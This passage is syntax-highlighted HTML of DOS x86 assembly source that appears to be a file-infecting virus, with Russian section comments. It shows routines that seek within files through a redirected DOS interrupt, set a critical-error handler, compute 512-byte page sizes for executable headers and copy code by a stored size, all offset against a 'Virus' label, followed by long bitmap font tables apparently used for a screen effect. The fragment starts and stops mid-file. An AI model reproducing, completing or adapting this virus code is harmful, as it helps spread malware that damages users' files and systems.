</span><span class="sc5">A06</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">A07</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A04</span><span class="sc0">

</span><span class="sc5">A08</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A04</span><span class="sc0">

</span><span class="sc5">A09</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Store</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A11</span><span class="sc0">

</span><span class="sc5">A10</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Store</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
</span><span class="sc5">A11</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A04</span><span class="sc0">

</span><span class="sc5">A12</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">A05</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc2">.286</span><span class="sc0">

</span><span class="sc5">Store</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">jcxz</span><span class="sc0">    </span><span class="sc5">NoStore</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">Loop2</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">NoStore</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">SetNewPos</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">pusha</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">sp</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">36h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4201h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bp</span><span class="sc4">+</span><span class="sc2">34h</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">popa</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                  ПОДПРОГРАММЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">GetFSize</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FSize</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">FSize</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Into512</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Seek</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">CmpStr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Loop3</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L3</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">L3</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop3</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Set24h</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2524h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Int24h</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">65h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">










</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                                 ШРИФТЫ</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Font1</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01111110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000001b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01111110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000001b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01111110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000001b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">Font1Ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Font1</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Font2</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11100000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01110000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00001110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00001110b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00111000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">01110000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11100000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">10000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11111111b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">11111111b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

</span><span class="sc5">Font2Ofs</span><span class="sc0">    </span><span class="sc9">dw</span><span class="sc0">  </span><span class="sc5">Font2</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">

</span><span class="sc5">Font3</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00110000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00011000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00001100b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">00000000b</span><span class="sc0">
